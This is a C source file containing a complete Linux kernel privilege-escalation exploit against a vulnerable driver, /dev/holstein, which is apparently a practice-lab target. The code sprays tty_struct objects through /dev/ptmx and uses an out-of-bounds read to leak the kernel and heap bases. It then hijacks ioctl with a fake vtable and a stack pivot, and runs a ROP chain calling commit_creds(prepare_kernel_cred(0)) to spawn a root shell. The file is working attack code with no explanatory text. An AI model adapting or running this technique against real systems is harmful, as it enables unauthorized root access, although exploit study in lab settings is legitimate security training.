#include<fcntl.h>
#include<stdio.h>
#include<sys/ioctl.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>

void spawn_shell(){
	system("/bin/sh");
}

unsigned long user_cs,user_sp,user_ss,user_rflags;


void save_state(){
	__asm__(
	".intel_syntax noprefix;"
	"mov user_cs,cs;"
	"mov user_sp,rsp;"
	"mov user_ss,ss;"
	"pushf;"
	"pop user_rflags;"
	".att_syntax;"
	);
}

int main(){

	int spray[100];
	for(int i=0;i<50;i++){
		spray[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
		if(spray[i]==-1){
			puts("Failed: /dev/ptmx");
		}
	}
	int vulnFd = open("/dev/holstein",O_RDWR);
	for(int i=50;i<100;i++){
		spray[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
	}

	unsigned long buffer[0x500/8];
	read(vulnFd,buffer,sizeof(buffer));
	// for(int i=0x400/8;i<0x500/8;i++){
	// 	printf("0x%lx\n",buffer[i]);
	// }
	unsigned long kernel_base = buffer[0x418/8]-0xc38880;
	unsigned long heap_base = buffer[0x438/8] - 0x438;

	printf("Kernel base: 0x%lx\n",kernel_base);
	printf("Heap base: 0x%lx\n",heap_base);

	// push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13 ; pop rbp ; ret
	unsigned long pivot_gadget = kernel_base+ 0x3a478a;
	unsigned long pop_rdi_ret = kernel_base + 0xd748d;
	unsigned long prepare_kernel_cred = kernel_base + 0x74650;
	unsigned long commit_creds = kernel_base + 0x744b0;
	unsigned long pop_rcx_ret = kernel_base + 0x13c1c4;
	unsigned long kpti_trampoline = kernel_base + 0x800e10 + 22;
	// 0xffffffff8162707b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 
	unsigned long mov_gadget = kernel_base + 0x62707b;
	// fake_vtable
	buffer[0x418/8] = heap_base+0x100;
	// ioctl hijack
	buffer[(0x100/8) + (96/8)] = pivot_gadget;

	save_state();
	// write(vulnFd,buffer,0x500);

	unsigned long* rop = buffer;
	*rop++ = 0x0;
	*rop++ = 0x0;
	*rop++ = pop_rdi_ret;
	*rop++ = 0x0;
	*rop++ = prepare_kernel_cred;
	*rop++ = pop_rcx_ret;
	*rop++ = 0x0;
	*rop++ = mov_gadget;
	*rop++ = commit_creds;
	*rop++ = kpti_trampoline;
	*rop++ = 0x0;
	*rop++ = 0x0;
	*rop++ = (unsigned long)spawn_shell;
	*rop++ = user_cs;
	*rop++ = user_rflags;
	*rop++ = user_sp;
	*rop++ = user_ss;

	write(vulnFd,buffer,0x500);
	for(int i=0;i<100;i++){
		ioctl(spray[i],0xcafebabe,heap_base);
	}
	return 0;
}
